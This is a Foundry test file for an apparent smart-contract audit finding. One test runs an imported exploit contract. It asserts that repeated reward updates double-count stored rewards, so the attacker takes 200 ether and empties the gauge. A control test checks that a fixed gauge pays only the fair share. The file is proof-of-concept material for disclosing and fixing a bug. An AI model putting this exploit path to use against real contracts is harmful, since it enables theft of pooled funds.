// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Exploit, Token, BaseGaugeFixed} from
    "./66159-c-05-double-counting-stored-rewards-causes-reward-inflation.sol";

contract Finding66159Test is Test {
    function test_exploit_three_updates_drain_the_pool() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.received(), 200 ether, "took both shares");
        assertEq(e.token().balanceOf(address(e)), 200 ether, "attacker");
        assertEq(e.token().balanceOf(address(e.gauge())), 0, "gauge empty");
        assertEq(e.gauge().rewards(address(e.token()), e.victim()), 100 ether, "victim booked");
    }

    function test_control_share_only_pays_the_accrual() public {
        Token token = new Token();
        BaseGaugeFixed gauge = new BaseGaugeFixed(token);
        address victim = address(uint160(0xBEEF));
        gauge.seed(address(this), 100 ether, 1e18, 0, 0);
        gauge.seed(victim, 100 ether, 1e18, 100 ether, 1e18);
        token.mint(address(gauge), 200 ether);

        gauge.updateUserRewards();
        gauge.updateUserRewards();
        gauge.updateUserRewards();
        assertEq(gauge.rewards(address(token), address(this)), 100 ether, "no double count");
        gauge.claimRewards();

        assertEq(token.balanceOf(address(this)), 100 ether, "fair");
        assertEq(token.balanceOf(address(gauge)), 100 ether, "victim reserve");
        assertEq(gauge.rewards(address(token), victim), 100 ether, "victim intact");
    }
}
